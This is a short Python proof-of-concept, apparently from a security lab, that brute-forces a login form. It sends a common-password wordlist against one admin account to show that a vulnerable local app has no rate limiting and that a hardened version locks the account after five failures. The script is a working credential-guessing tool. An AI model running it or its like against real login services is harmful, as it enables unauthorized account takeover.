"""
PoC 5.3 - Brute-force login / no rate limiting
===============================================
Sends multiple login attempts against the same account.
v1 has no lockout - all attempts go through.
v2 blocks the account after 5 failures.

Requirements: v1 on http://127.0.0.1:5000, v2 on http://127.0.0.1:5001
"""

import requests
import time

V1 = "http://127.0.0.1:5000"
V2 = "http://127.0.0.1:5001"
TARGET_EMAIL = "admin@authx.internal"

WORDLIST = [
    "123456", "password", "qwerty", "letmein", "admin",
    "welcome", "monkey", "dragon", "master", "abc123",
    "pass1234", "iloveyou", "sunshine", "princess", "football",
]


def attempt(base, email, password):
    r = requests.post(
        f"{base}/login",
        data={"email": email, "password": password},
        allow_redirects=False,
    )
    return r.status_code


def separator(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)


def run_wordlist(base, label):
    print(f"[*] Sending {len(WORDLIST)} login attempts to {label}...\n")
    blocked = False
    for pwd in WORDLIST:
        status = attempt(base, TARGET_EMAIL, pwd)
        if status == 302:
            label_str = "SUCCESS"
        elif status == 429:
            label_str = "BLOCKED (429 Too Many Requests)"
            blocked = True
        else:
            label_str = f"fail ({status})"
        print(f"    {pwd:<20} -> {label_str}")
        if blocked:
            break
        time.sleep(0.1)
    return blocked


def main():
    # ── v1: attack ──────────────────────────────────────────────
    separator("v1-vulnerable - attack")
    blocked = run_wordlist(V1, "v1")
    if not blocked:
        print("\n    [!] All attempts completed - no lockout triggered.")

    # ── v2: re-test ──────────────────────────────────────────────
    separator("v2-secure - re-test")
    blocked = run_wordlist(V2, "v2")
    if blocked:
        print("\n    [+] Account locked out after 5 failed attempts.")
    else:
        print("\n    Lockout was not triggered - check v2 is running.")


if __name__ == "__main__":
    main()
